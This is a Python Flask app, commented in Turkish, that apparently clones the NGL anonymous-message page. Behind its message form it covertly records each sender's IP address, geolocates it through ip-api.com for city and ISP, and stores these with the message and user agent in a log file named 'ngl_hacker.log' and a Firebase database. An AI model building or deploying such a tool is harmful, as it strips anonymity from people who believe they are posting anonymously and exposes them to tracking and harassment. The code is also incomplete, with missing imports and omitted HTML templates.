from flask import Flask, request, render_template_string, redirect
import logging
import requests
import os
import json
from datetime import datetime

# Firebase'i başlat (kodun başında)
try:
    # Render'da Environment Variable varsa onu kullan
    if 'GOOGLE_APPLICATION_CREDENTIALS' in os.environ:
        cred = credentials.Certificate.from_service_account_info(
            json.loads(os.environ['GOOGLE_APPLICATION_CREDENTIALS'])
        )
    else:
        # Yerel test için dosya
        cred = credentials.Certificate("serviceAccountKey.json")
    
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://SENIN-PROJE-ID-default-rtdb.firebaseio.com/'
    })
    print("Firebase başarıyla başlatıldı")
except Exception as e:
    print(f"Firebase hatası: {str(e)}")

# Logging ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# HOME_HTML ve NGL_HTML aynı kalıyor (seninkini kopyala, değişiklik yok)

# ... (HOME_HTML ve NGL_HTML string'lerini buraya yapıştır, uzun diye atladım)

@app.route('/', methods=['GET', 'POST'])
def home():
    username = request.args.get('username', '').strip()
    if username:
        return redirect(f"/{username}")
    return render_template_string(HOME_HTML)

@app.route('/<username>', methods=['GET', 'POST'])
def ngl_page(username):
    client_ip = None
    if 'CF-Connecting-IP' in request.headers:
        client_ip = request.headers['CF-Connecting-IP'].strip()
    elif 'X-Forwarded-For' in request.headers:
        forwarded = request.headers['X-Forwarded-For'].split(',')[0].strip()
        if forwarded and forwarded != 'unknown':
            client_ip = forwarded
    elif 'X-Real-IP' in request.headers:
        client_ip = request.headers['X-Real-IP'].strip()
    else:
        client_ip = request.remote_addr or '127.0.0.1'

    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]

    location = "Konum alınamadı"
    isp = "Bilinmiyor"
    if client_ip not in ['127.0.0.1', '::1']:
        try:
            geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6).json()
            if geo.get('status') == 'success':
                city = geo.get('city', 'Bilinmiyor')
                region = geo.get('regionName', '')
                country = geo.get('country', '')
                location = f"{city}, {region}, {country}"
                isp = geo.get('isp', 'Bilinmiyor')
        except:
            pass

    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
            logging.info(log_entry)
            print(f"[YENİ MESAJ] {log_entry}")

            # Firebase'e push et
            try:
                message_data = {
                    "username": username,
                    "message": msg,
                    "ip": client_ip,
                    "location": location,
                    "isp": isp,
                    "user_agent": user_agent[:150],
                    "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                }
                ref = db.reference('/messages')
                ref.push(message_data)
                print("[FIREBASE] Mesaj başarıyla kaydedildi")
            except Exception as e:
                print(f"[FIREBASE HATASI] {str(e)}")
                logging.error(f"Firebase push hatası: {str(e)}")

        return render_template_string(NGL_HTML, username=username, success=True)

    return render_template_string(NGL_HTML, username=username, success=False)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
